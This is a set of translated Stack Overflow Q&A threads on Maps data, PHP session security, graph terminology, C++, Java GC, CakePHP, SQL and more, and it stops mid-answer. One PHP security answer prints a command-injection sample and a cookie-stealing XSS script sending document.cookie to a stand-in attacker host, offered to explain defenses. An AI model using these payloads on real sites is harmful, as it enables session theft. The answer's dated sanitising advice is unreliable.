> 时间：2013-01-01T15:42:12.793

这不是 Google Maps API v3 的一部分。您可以使用[Fusion Tables](https://www.google.com/fusiontables/)中的[自然地球数据集](http://www.naturalearthdata.com/)来获取该信息。 [这是一个使用](http://www.geocodezip.com/geoxml3_test/v3_FusionTables_query_sidebarF_local.html?country=Canada)[FusionTablesLayer](https://developers.google.com/maps/documentation/javascript/reference#FusionTablesLayer)在 Google 地图上显示加拿大各省的示例。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T16:55:17.590

[**Geonames**](http://www.geonames.org/)地理数据库可在知识共享署名许可下免费下载，其中包含可能有帮助的各种数据集。适合您要求的一个是[admin2Codes.txt](http://download.geonames.org/export/dump/admin2Codes.txt)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-12-14T23:57:50.153

请查看 ISO-3166-2。它是基于国家/地区的 ISO 标准。您无需依赖谷歌地图或任何其他网络服务。它以纯 JSON 文件的形式提供。

# php - 保护 PHP 会话免受 XSS 攻击

> ID：14111659
> 
> 赞同：2
> 
> 时间：2013-01-01T15:27:26.220
> 
> 标签：php, html, session, input, xss

我已经阅读了很多关于`owasp.org`保护 PHP 会话的文章，其中我记得最多但不能很好理解的一件事。

我不能很好地理解保护会话是如何进行的，因此我在这里问。在 PHP 中保护会话的最佳方法是什么？

附带问题：文件输入是否容易受到 XSS 攻击？

这是 PHP 会话劫持的来源： [OWASP.org: PHP Security Cheat Sheet](https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet#Session_Management)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T15:45:12.350

> 在 PHP 中保护会话的最佳方法是什么？

安全就像你去专柜买一瓶牛奶。阅读客户评论可能会告诉您最好的牛奶是什么，但是对于安全来说，这有点不同。

客户评论是 Owasp 概述的内容。它告诉您安全会话处理的一般动态和含义。

由于 PHP 会话只是 PHP 本身提供的某种基本功能，因此没有太多可以告诉您保护这些会话的最佳方法是什么，因为这在很大程度上取决于*您如何使用该功能*。

*然而，使用 PHP 会话的最佳方式*的一个明确部分是密切关注 PHP 本身的安全报告和审查以及特定的会话功能。然后注意保持最新的 PHP 版本，它提供了*保护会话的最佳方式*，这*可能*是最新的稳定版本。有时如果报告了缺陷，下一个版本并没有完全修复，所以要小心。

其他与 PHP 无关的东西都是未定义的，Owasp 在这里只能提供一个子集。

因此，为了安全起见，在开始将其应用于（您的）PHP 代码之前，首先了解 Owasp 文档中概述的内容是绝对重要的。例如，通过在这里提问，恕我直言，最好的方向是你学习更难理解发生了什么以及 Owasp 文档中的含义。

了解事物的工作原理是安全性的关键。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T16:15:06.713

以下是一些需要牢记的主要问题：

## 不验证用户输入

假设您有一个允许用户查看文件夹内容的网页（例如，您的托管公司并向用户显示他们在服务器上的文件）

下面是一些可能实现它的代码：

```
$directory = $_GET['directory'];

exec("ls $directory", $result); 
```

攻击者可以通过将其他命令传入 url 字符串来利用这一点，例如：

```
ls -LR 
```

## 会话劫持

每个会话都有一个唯一的 ID，如果攻击者获得它，他们可以（可能）使用它来获取机密信息。

为了防止这种情况，让用户在做任何敏感的事情之前（使用他们的密码）重新验证（例如，如果用户想要重置他们的密码，强制他们先输入旧密码）

## XSS（跨站脚本攻击）

每当您拥有一个包含用户生成内容的站点时（一个很好的例子是博客上的评论），攻击者就有可能将 JavaScript 放入他的内容（阅读：他的评论）中，这可能会损害所有用户来到页面。

这是一个例子：

```
<script> 
    document.location = 'http://www.hackingYou.com/stealYourData.php?' + document.cookie; 
</script> 
```

此代码将允许攻击者网站 (hackingYou.com) 窃取您当前访问的网站的 cookie。

防止这种情况的一种方法是从使用以下命令输入的任何字符串中删除任何 HTML：

```
strip_tags($input); 
```

## SQL 注入

（没有这个就不是一个体面的答案）

假设您有一个将用户登录到站点的网页。为了使他们成功登录，您检查他们在数据库中的记录。

以下是它的编码方式：

```
$sql = "SELECT * FROM users WHERE username = $_GET['username'] and password = $_GET['password']"; 
```

攻击者可以通过输入密码字段来利用它：

```
abcd OR WHERE 1 = 1 
```

生成的 sql 语句如下所示：

```
SELECT * FROM users WHERE username = hacker AND password = abcd OR WHERE 1 = 1; 
```

这将向攻击者吐出所有用户名和密码的完整表。

为了防止这种“清理”您的 SQL 输入字符串，请使用以下命令：

```
mysql_real_escape_string($input) 
```

这是大部分基础知识，显然人们应该始终通过阅读最新的安全公告来了解最新情况，例如：

*   [错误跟踪](http://www.securityfocus.com/archive/1)
*   [PHP Security Consortium](http://phpsec.org/)（专注于安全的 PHP 专家）
*   [OWASP](https://www.owasp.org/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T15:53:17.110

确保所有环境安全的最佳方法是学习 PHP Web 框架，它将为您提供随时可用的安全级别输入。

显然，安全性不存在，它存在更好的安全性和最差的安全性，我建议你不要重新发明轮子，因此根据社区错误/黑客报告，Web 框架每天都会被深度修复，而这，我想想，是您可以获得的最大安全级别！

# graph - 节点和顶点有什么区别？

> ID：14111660
> 
> 赞同：50
> 
> 时间：2013-01-01T15:27:35.377
> 
> 标签：graph, tree, nodes, vertex

节点和顶点之间有什么区别（如果有的话）？看了无数个网站都找不到答案！甚至我的书也没有具体说明，所以我有点迷路了！

*值得一提的是，除了在图形中使用时称为“顶点”而在树中使用时称为“节点”这一事实之外，我还在寻找差异。*

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2013-01-01T15:35:50.383

**单词Node**和**Vertex**之间没有区别。即使在一些解释图论和图算法的书中，他们也将其命名为：

> *顶点用v表示，有时也称为节点*

它们之间没有主要或次要的区别。

这在书中提到：Data structure and Algorithms with Object Oriented Design Patterns in C#, Bruno R, Preiss。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2021-01-24T03:13:11.607

在“The Practitioner's Guide to Graph Data”中，作者避免使用“节点/节点”一词，只使用顶点/顶点，他们解释如下：

> ...因为我们专注于分布式图，节点在分布式系统、图论和计算机科学中具有不同的含义。

在分布式系统中，节点可以是客户端、服务器或对等点，而在计算机网络中，它可以是计算机或调制解调器。正如您已经指出的那样，在计算机科学中，它可以用于图论或树系统。

因此，在图论的上下文中，节点和顶点可以互换使用。但是，如果您想清楚并避免任何误解，顶点/顶点是要走的路。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2022-01-13T10:02:54.637

In think这两个术语都来自对图形和网络的不同感知。Albert-László Barabási[在他最近的教科书中写道](http://networksciencebook.com/chapter/2#networks-graphs)。

“在科学文献中，术语网络和图可以互换使用：

| 网络科学 | 图论 |
| --- | --- |
| 网络 | 图形 |
| 节点 | 顶点 |
| 关联 | 边缘 |

然而，这两个术语之间有一个微妙的区别：{network, node, link} 组合通常指的是真实系统： WWW 是由 URL 链接的 Web 文档网络；社会是通过家庭、友谊或专业联系联系起来的个人网络；代谢网络是细胞中发生的所有化学反应的总和。相比之下，当我们讨论这些网络的数学表示时，我们使用术语 {graph, vertex, edge}：我们谈论网络图、社交图（Facebook 流行的一个术语）或代谢图。然而，这种区分很少出现，因此这两个术语通常是彼此的同义词。”

<tl;dr> 相同，相同，但不同。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-06-06T23:00:50.740

节点和顶点之间没有区别。大多数书籍使用*V*来表示图的*顶点*。我见过主要与树相关的节点*。*

例如，您可能遇到过 O(V + E) 用于表示深度优先搜索和广度优先搜索图遍历的时间复杂度。

类似地，*V*被用作其他图算法（如 Prim's、Kruskal's 等）的时间复杂度分析的一部分。

# php - 计算到下一个 xx:x7 的时间

> ID：14111664
> 
> 赞同：0
> 
> 时间：2013-01-01T15:28:00.143
> 
> 标签：php, date

我经常习惯于获得下一个每日事件的时间，但是更短的时间间隔呢？`strtotime("next ***time***")`

每次分钟的个位为 7 时都会发生一些事情（以10 分钟为间隔`00:07`，以此类推）`00:17``00:27`

因此，鉴于当前时间，我如何才能获得下一个时间？

目前我能想到的最好的是`strtotime(substr(date("Y-m-d H:i"),0,-1)."7")`，但它似乎有点脏，甚至在 xx:x7 和 xx:x0 之前的时间都不起作用。有没有更好的办法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:58:29.327

支持的用法`DateTime`：

```
<?php
$dt = new DateTime('2013-01-01 16:54:11');
for($qq = 0; $qq < 10; ++$qq) { // loop to test all minute remainders
    $dt->modify('+1 minute +3seconds'); // seconds just for show
    $min = +$dt->format('i'); // current minutes
    $sec = +$dt->format('s'); // current seconds
    $r10 = $min % 10;
    // if it's hh:27 now, this will result in hh:37, change >= to > if that forwarding is not needed
    if($r10 >= 7) {
        $deltaMin = 17 - $r10;
    } else {
        $deltaMin = 7 - $r10;
    }
    // time left until next "good" point in time
    $change = sprintf('%+d minutes -%d seconds', $deltaMin, $sec);
    $new = clone($dt);
    $new->modify($change);
    printf("%s\t %s\n%s\n--\n", $dt->format('r'), $change, $new->format('r'));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T16:15:15.567

你快到了：

```
$now = time() + (date('is')>5700?600:0);
$new = strtotime(substr(date("Y-m-d H:i", $now),0,-1)."7"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T18:42:23.130

一种选择是使用该[`DateTime::setTime()`](http://php.net/datetime.settime)方法，并带有一点算术。

```
$date = new DateTime('12:34', new DateTimeZone('Europe/Paris'));

$minute = ceil(($date->format('i') - 7 + 1) / 10) * 10 + 7;
$date->setTime($date->format('G'), $minute, 0);

echo $date->format('H:i'); // 12:37 
```

* * *

出于演示目的，在循环中使用它的示例：

```
$date = new DateTime('16:00', new DateTimeZone('Europe/Paris'));
$period = new DatePeriod($date, new DateInterval('PT1M'), 60);
foreach ($period as $date) {
    echo $date->format('H:i => ');

    $minute = ceil(($date->format('i') - 7 + 1) / 10) * 10 + 7;
    $date->setTime($date->format('G'), $minute, 0);

    echo $date->format('H:i'), PHP_EOL;
} 
```

上面的输出类似于：

```
16:00 => 16:07
16:01 => 16:07
16:02 => 16:07
16:03 => 16:07
16:04 => 16:07
16:05 => 16:07
16:06 => 16:07
16:07 => 16:17
16:08 => 16:17
16:09 => 16:17
16:10 => 16:17
... removed to save scrolling ...
16:50 => 16:57
16:51 => 16:57
16:52 => 16:57
16:53 => 16:57
16:54 => 16:57
16:55 => 16:57
16:56 => 16:57
16:57 => 17:07
16:58 => 17:07
16:59 => 17:07
17:00 => 17:07 
```

[» 查看这个在线运行的示例](http://codepad.viper-7.com/onFqkZ)

# c++ - c ++强制运算符==从接口抽象类重载

> ID：14111668
> 
> 赞同：7
> 
> 时间：2013-01-01T15:28:13.827
> 
> 标签：c++, operator-overloading, abstract-class

在 c++ 上使用接口（抽象类）我需要强制任何类而不是继承接口来实现运算符 ==。考虑这种情况：

```
class IBase
{
   virtual void someFunc() const = 0; 
}

class CInheritClass : public IBase
{
   virtual void someFunc() const; 
   virtual bool operator== ( const CInheritClass& obj ) const;
}

void main()
{
  CInheritClass instance;
} 
```

类 CInheritClass 必须实现 someFunc 因为它继承了 Ibase，实现`virtual bool operator== ( const CInheritClass& obj ) const;`不是强制性的。我想以任何继承者 X 必须实现的方式修改 IBase 类

```
virtual bool operator== ( const X& obj ) const 
```

以下代码将起作用：

```
template<class X>
class IBase
{
   virtual void someFunc() const = 0; 
   virtual bool operator== ( const X& obj ) const = 0;

}

class CInheritClass : public IBase<CInheritClass>
{
   virtual void someFunc() const; 
   virtual bool operator== ( const CInheritClass& obj ) const;
} 
```

但我追求不使用模板的解决方案，因为每个希望实现 IBase 的类都必须继承 IBase 并将其自身作为模板类`class X : public IBase<X>`，这对于任何可能查看我的代码的未来开发人员来说都是令人困惑和不清楚的。任何的想法 ？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-01T15:39:50.020

使用纯虚函数声明

```
virtual bool operator== ( const IBase& obj ) const = 0; 
```

实施示例：

```
bool CInheritClass ::operator==( const IBase& obj ) const
{
     const CInheritClass *o = dynamic_cast<const CInheritClass*>(&obj);
     if (o == NULL) return false;
     // TODO
} 
```

输入类型应该是基类，如果不是，您将无法对基对象进行多态调用比较

对于从模板继承的想法：警告，基类在 2 个派生类之间不再相同。=>基类的目的改变了：使用模板你只是共享代码，强制用户实现功能并防止2个派生类之间的重复代码

这真的取决于你想要做什么。它可以是一个好的设计，也可以不是......

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-03-21T19:48:19.767

仅供参考，模板版本通常称为“Barton-Nackman 技巧”： [http ://en.wikipedia.org/wiki/Barton%E2%80%93Nackman_trick](http://en.wikipedia.org/wiki/Barton%E2%80%93Nackman_trick)

如果您希望您的派生类只能与它们自己类型的其他对象（而不是抽象基类型）相比较，那么这就是使用的“技巧”，IMO。

EDIT: This is similar to the way that Java implements the Comparable interface, so it's not as if (good) programmers won't know what's going on: [http://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html](http://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T15:46:38.797

让我们在这里分解您的要求。您想强制每个孩子`operator==`使用其自己类型的右侧来实现。但是您还要求将所述操作员设为虚拟。由于每个子运算符的参数类型将与父虚拟方法的参数类型不同，因此您最终会隐藏基类运算符。因此，您将永远无法多态地调用它，并且比较的虚拟性根本没有用处。

相反，我建议只是删除父运算符的虚拟性，并在*使用*`==`子类时使用您需要的位置。然后编译器会告诉你它什么时候丢失。

但是，如果您确实需要能够对基础对象进行多态调用比较，则很可能必须使用双重调度之类的东西来确保双方都访问派生最多的类型并验证派生最多的类型是否相同（否则比较是没有意义的）。

编辑：如果您真的需要该功能，我看不出模板基类有什么特别错误 - 只需检查您的设计并确保您确实需要它。

# javascript - 为 ember.js 执行 TDD/BDD 的最佳方法是什么？

> ID：14111669
> 
> 赞同：5
> 
> 时间：2013-01-01T15:28:26.767
> 
> 标签：javascript, tdd, ember.js, bdd, jasmine

使用 Jasmine 找到了一种方法：[Ember.js TDD – 如何测试您的 ember 视图](http://shairez.com/2012/07/ember-js-tdd-how-to-test-your-ember-views/)

有人用过这种方法吗？有没有其他/更好的方法来为 Ember 做 TDD/BDD？

# cassandra - Apache Cassandra CQL3 多种复合列格式

> ID：14111672
> 
> 赞同：1
> 
> 时间：2013-01-01T15:28:43.830
> 
> 标签：cassandra, cql, cql3

使用 CQL3，是否可以在表/列族中定义多种格式的复合列？使用语法：

```
PRIMARY KEY(A, B, C) 
```

看起来 A 成为行键，创建了 B:C 的复合列，并为每个附加列创建了附加的复合列，并在 B:C 前面添加。

如果我想在同一个列族中拥有另一个复合列 X:Y - 可以实现吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T08:08:26.380

我不确定是否可以使用 CLI。但是我们正在为 Cassandra 使用 PlayOrm，这是很有可能的。基本上，您可以拥有数百万个复合列。阅读[本文](https://github.com/deanhiller/playorm/wiki/A-basic-%2aToMany-example-TestOneToMany)了解更多详情。该示例是针对 OneToMany 关系给出的，在该关系中，您可以拥有多个名称，如 activity.act1、activity.act2。同样，您可以拥有更多具有 *ToMany 关系的实体，并将它们保存在复合列中。如果您不想使用 *ToMany 关系，那么您可以尝试它的[@NoSqlEmbedded](https://github.com/deanhiller/playorm/wiki/@NoSqlEmbedded-for-Integer,-LocalDate-and-String-list)模式，该模式也将数据存储在复合列中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-10-28T11:04:11.440

主键标识表的单行（所有列出的组件）。这`A`是一个分区键，用于定义此分区在特定服务器上的位置。

在 CQL3 中，每个表/列族只有一个主键。如果您需要以不同的方式访问它，您可以（有一些限制）使用物化视图，或将数据复制到单独的表中。

# windows-phone-7 - 播放器在应用程序中崩溃

> ID：14111675
> 
> 赞同：0
> 
> 时间：2013-01-01T15:28:46.807
> 
> 标签：windows-phone-7

全部。我正在尝试使用 Visual Studio 2010 为 Windows Phone 7 开发一个应用程序。它是一个音乐播放器，应该能够根据当前事件播放音乐。

我设法提取了事件，但是当我尝试将它与播放器结合时，整个播放器就会崩溃。这是代码。

```
void Appointments_SearchCompleted(object sender, AppointmentsSearchEventArgs e)
    {
        try
        {
            AppointmentResultsDataLINQ.DataContext =
                from Appointment appt in e.Results
                where appt.IsAllDayEvent == false                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                select appt;       

        }
        catch (System.Exception)
        {
            //No results
        }
    }

    private void button2_Click(object sender, RoutedEventArgs e)
    {

        if ((((Appointment)(AppointmentResultsDataLINQ.DataContext)).Subject).Equals("Meeting"))
        {
             mediaElement1.Source = new Uri("http://www.opendrive.com/files/NV8zNTMwNDYwX2hxRXZR/Crystallize.mp3", UriKind.Absolute);              
        }          

        else
        {
            mediaElement1.Source = new Uri("https://www.opendrive.com/files/NV8zMjAxODY0X0VBNDJY/Hetken%20tie%20on%20kevyt%20(piano%20cover)%20-%20YouTube.mp3", UriKind.Absolute);                
        }
            mediaElement1.Play();
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T19:43:40.057

问题在于演员阵容。您正在尝试`AppointmentResultsDataLINQ.DataContext`将`Appointment`. 这根本不符合逻辑。您需要从使用 LINQ 中选择一个具体的约会（类似于您的代码`Appointments_SearchCompleted`，恕我直言什么都不做）

# java - 运行模拟器时出现“com.android.exchange.ExchangeService has leaked ...”错误

> ID：14111677
> 
> 赞同：17
> 
> 时间：2013-01-01T15:29:08.643
> 
> 标签：java, android

在将我的模拟器与 IntelliJ 一起使用时，我看到了许多这样的错误。我不知道该怎么办。它似乎没有影响任何东西，所以我没有太注意它。但我担心它可能会在不久后引起问题。

```
01-01 15:16:22.805: ERROR/StrictMode(607): null
        android.app.ServiceConnectionLeaked: Service com.android.exchange.ExchangeService has leaked ServiceConnection com.android.emailcommon.service.ServiceProxy$ProxyConnection@40cf0270 that was originally bound here
        at android.app.LoadedApk$ServiceDispatcher.<init>(LoadedApk.java:969)
        at android.app.LoadedApk.getServiceDispatcher(LoadedApk.java:863)
        at android.app.ContextImpl.bindService(ContextImpl.java:1418)
        at android.app.ContextImpl.bindService(ContextImpl.java:1407)
        at android.content.ContextWrapper.bindService(ContextWrapper.java:473)
        at com.android.emailcommon.service.ServiceProxy.setTask(ServiceProxy.java:157)
        at com.android.emailcommon.service.ServiceProxy.setTask(ServiceProxy.java:145)
        at com.android.emailcommon.service.AccountServiceProxy.getDeviceId(AccountServiceProxy.java:116) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T07:12:54.457

该答案并不能解决问题，只会使症状消失。尝试在模拟器选项中禁用主机 GPU，它为我解决了这个问题。

# java - Java - 可以对正在执行方法的对象进行垃圾收集吗？

> ID：14111679
> 
> 赞同：19
> 
> 时间：2013-01-01T15:29:30.543
> 
> 标签：java, object, garbage-collection, main

在 Java 中，我做了以下类似的事情而没有考虑太多：

```
public class Main {

    public void run() {
        // ...
    }

    public static void main(String[] args) {
        new Main().run();
    }
} 
```

但是，最近我不确定这样做是否安全。毕竟，`Main`对象创建后没有引用（嗯，有`this`引用，但这算不算？），所以看起来垃圾收集器可能会在对象执行过程中删除它某物。所以也许这个`main`方法应该是这样的：

```
 public static void main(String[] args) {
        Main m = new Main();
        m.run();
    } 
```

现在，我很确定第一个版本可以工作，而且我从来没有遇到过任何问题，但我想知道在所有情况下是否都安全（不仅在特定的 JVM 中，而且最好根据语言规范对这种情况的描述）。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-01-01T15:30:37.690

如果正在执行对象方法，则意味着有人拥有该引用。所以不，在执行方法时不能对对象进行 GC。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T16:17:12.477

在大多数情况下，垃圾收集是透明的。它可以消除手动内存管理的不必要的复杂性。因此，它看起来不会被收集，但实际发生的事情更加微妙。

很简单，编译器可能会完全省略对象的构造。（通过编译器，我的意思是比 javac 更低级别的编译器。字节码将是源的字面音译。）更模糊的是，垃圾收集通常在单独的线程中运行，并且实际上将未访问的对象作为正在运行的方法删除。

如何观察到这一点？终结者中的常见嫌疑人。它可以与对象上运行的方法同时运行。通常，您可以`synchronized`通过终结器和普通方法中的块来解决这个问题，这引入了必要*的先发生*关系。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-01T17:30:43.133

m 只是一个存储了引用的变量。这将被程序员用来进一步使用同一个对象在同一个对象上编写逻辑。

执行时，程序将转换为 OP-CODES / INSTRUCTIONS 。这些指令将引用对象（毕竟它是一个内存位置）。如果 m 存在，将通过 INDIRECT REFERENCE 访问对象的位置。如果 m 不存在，则参考为 DIRECT。

所以在这里，对象被 CPU 寄存器使用，而与引用变量的使用无关。

这将一直可用，直到执行流程在 main() 函数的范围内。

此外，根据 GC 过程，GC 只会从内存中删除对象，一旦 GC 确定该对象将不再被使用。

每个对象都有机会多次生存（取决于情况和算法）。一旦机会的数量结束，那么只有对象被垃圾收集。

简而言之，最近使用的对象将有机会留在内存中。旧对象将从内存中删除。

所以给定你的代码：

```
public class Main {

public void run() {
    // ...
}

public static void main(String[] args) {
    new Main().run();
}
} 
```

该对象不会被垃圾收集。

另外，例如，请尝试查看匿名类示例。或者来自 AWT / SWING 中事件处理的示例。

在那里，你会发现很多这样的用法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-06-05T04:15:44.277

接受的答案不正确。对象是否可以被 GC 取决于你的`public void run() {// ...}`方法是否引用了类实例（this）。尝试：

```
public class FinalizeThis {

    private String a = "a";

    protected void finalize() {
        System.out.println("finalized!");
    }

    void loop() {
        System.out.println("loop() called");
        for (int i = 0; i < 1_000_000_000; i++) {
            if (i % 1_000_000 == 0)
                System.gc();
        }
        // System.out.println(a);
        System.out.println("loop() returns");
    }

    public static void main(String[] args) {
        new FinalizeThis().loop();
    }
} 
```

上面的程序总是输出

```
loop() called
finalized!
loop() returns 
```

在 Java 8 中。但是，如果您取消注释`System.out.println(a)`，则输出将更改为

```
loop() called
a
loop() returns 
```

这次没有GC，因为调用的方法引用了实例变量（this.a）。

你可以看看[这个答案](https://stackoverflow.com/questions/26642153/finalize-called-on-strongly-reachable-objects-in-java-8)

# cakephp - CakePHP 2.x：将 $this->Session->data 数组发送到另一个视图/控制器

> ID：14111680
> 
> 赞同：0
> 
> 时间：2013-01-01T15:29:49.700
> 
> 标签：cakephp, cakephp-2.0, cakephp-2.1

寻找执行以下操作的最有效方法：

## 细节：

1个控制器：

*   报告

2 意见：

1.  **创建报告**
2.  **查看报告**

**create_report**有一个表单，用于收集将在**view_report**视图中使用的信息。我知道表单中输入的数据可通过**$this->session->data**元素在**create_report**视图中使用。

 **## 寻求帮助：

我需要做的是将相同的信息（$this->session->data）从**create_report**视图发送到**view_report**视图（我假设是通过控制器）。

## 到目前为止我所拥有的：

只是一个链接：

```
echo $this->Html->link('View Report', array('controller' => 'reports', 'action' => 'view_report')); 
```

但这只会将用户带到**view_report**视图。它不会将**$this->session->data**中的信息发送到该视图。

我认为这与 Js 助手有关，但我找不到任何直接处理 CakePHP 2.x 的这种情况的帖子。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:37:56.140

您可以通过控制器操作 create_report 绕过数据处理，并将它们直接发送到报告视图并在需要时在那里进行验证。只需在 create_report.ctp 视图中更改表单创建。

```
$this->Form->create('Report', array('action' => 'view_report')); 
```

数据将直接提交给 view_report 操作并在 $this->request->data 中可用

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T15:48:26.763

如果您在会话中存储了数据，那么您可以直接从 view_report 视图或任何其他视图访问它。为此，您可以使用会话助手。

```
$this->Session->read('whatever'); 
```

要使用这种方法，请确保您已加载 Session Helper。更多信息在[这里](http://book.cakephp.org/2.0/en/core-libraries/helpers/session.html)。

或者，您可以像使用任何其他数据一样，在控制器中使用 $this->set 将会话数据传递给视图。

如果你想，为了调试，查看当前会话的内容，你可以从你的视图中转储会话......

```
var_dump($this->Session); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-13T16:26:21.297

这种方式也可以使用，在这种情况下，您可以将任何操作发送到任何控制器

```
$this->Form->create('Report', array('url' => '/my_contoller/my_action')); 
```**

# spring-mvc - 在重定向视图 Spring MVC 中传递参数

> ID：14111687
> 
> 赞同：5
> 
> 时间：2013-01-01T15:30:39.967
> 
> 标签：spring-mvc

我无法获得如何从控制器传递参数和主 url。我试过这样：

```
 return new ModelAndView(new RedirectView("home?var=ss", true)); 
```

但我得到**var**的空值。正确的方法是什么？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-01-01T15:48:53.830

[文档](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/htmlsingle/spring-framework-reference.html#mvc-ann-redirect-attributes)说：

> 默认情况下，所有模型属性都被视为在重定向 URL 中作为 URI 模板变量公开。在剩余的属性中，那些是原始类型或原始类型的集合/数组的属性会自动附加为查询参数。

因此，除了确保您有一个名为 的模型属性`var`，其值为之外，您无需做任何事情`ss`。

# google-maps - google place API 上是否有 OR 运算符？

> ID：14111689
> 
> 赞同：1
> 
> 时间：2013-01-01T15:30:52.480
> 
> 标签：google-maps, google-places-api

我正在[将此 api 调用](https://developers.google.com/places/documentation/search#PlaceSearchRequests)与 &keyword= 一起使用，并且我想在关键字中包含多个单词，但它们是 OR。我试过 OR 和 | 但它似乎忽略了它。[这里的例子](https://plus.google.com/local/harlev/s/taxi%20%7C%20cab%20%7C%20minicab)

是否可以在 google 地方搜索中使用 OR 关键字

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T04:11:05.250

Google Places API 当前不支持请求中的多个关键字或名称。已在[此处](http://code.google.com/p/gmaps-api-issues/issues/detail?id=4278)提交了 Places API 功能请求。

如果您认为这将是一个有用的功能，请确保您的星号请求让我们知道您有兴趣看到它被添加。

# objective-c - ARC语义问题Objective-c

> ID：14111690
> 
> 赞同：0
> 
> 时间：2013-01-01T15:30:53.587
> 
> 标签：objective-c, xcode

我正在使用 xcode 在 Objective-c 中创建一个 ios 应用程序，但遇到了一个奇怪的错误。代码是：

```
#import "LAAppDelegate.h"
#import "Reachability.h"

@implementation LAAppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:    (NSDictionary *)launchOptions
{
    NetworkStatus networkStatus =
        [[Reachability reachabilityForInternetConnection]
         currentReachabilityStatus];
    if (networkStatus == NotReachable) {
        UIAlertView *alert = [[UIAlertView alloc]
        initWithTite:@"Network Unavailable"
        message:@"Lazuli requires an internet connection"
        delegate:nil
        cancelButtonTitle:@"Ignore"
        otherButtonTitles:nil];
    [alert show];

    }

   // Override point for customization after application launch.
   return YES;
} 
```

我不断收到错误消息：“'UIAlertView' 没有可见的@interface 声明选择器'initWithTite:message:delegate:cancelButtonTitle:otherButtonTitles:'”

我是初学者，需要帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-01T15:33:05.097

您的方法调用中有错字。它是 initWith **Title** ...，而不是 initWith **Tite** ...

# sql - 需要查询以删除 SQL 中两个文件之间的重复项

> ID：14111697
> 
> 赞同：0
> 
> 时间：2013-01-01T15:31:31.527
> 
> 标签：sql

SQL新手。

将两个文件导入到索赔表 (Claims) 中。文件 4028 有 6,721 行，文件 2090 有 4,707 行。两个文件具有相同的列（Amt、First、Last、FillDate）。

使用以下查询来识别重复项：

```
SELECT first, last, amt, filldate, COUNT(*) AS duplicatecount
FROM Claims
WHERE fileid IN (4028, 2090)
GROUP BY first, last, amt, filldate
HAVING COUNT(*) > 1
ORDER BY 1,2 DESC 
```

需要查询以删除两个文件之间的重复项。从文件 2090 中删除。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:39:49.487

一种可能性是用于`EXISTS`确保删除时存在重复项。

```
DELETE C
FROM Claims C
WHERE C.fileId = 2090
AND EXISTS (
    SELECT 1
    FROM Claims D
    WHERE 
        D.fileid = 4028 
    AND C.first = D.first 
    AND C.last = D.last
    AND C.amt = D.amt
    AND C.filldate = D.filldate
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:43:12.687

```
DELETE * FROM Claims WHERE fileid = 2090 AND first IN (the query you used to find the duplicates) 
```

试试这个......如果它有效，请告诉我......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T15:53:01.600

您可以使用相关子查询。

```
 delete * from yourtable a
   inner join 
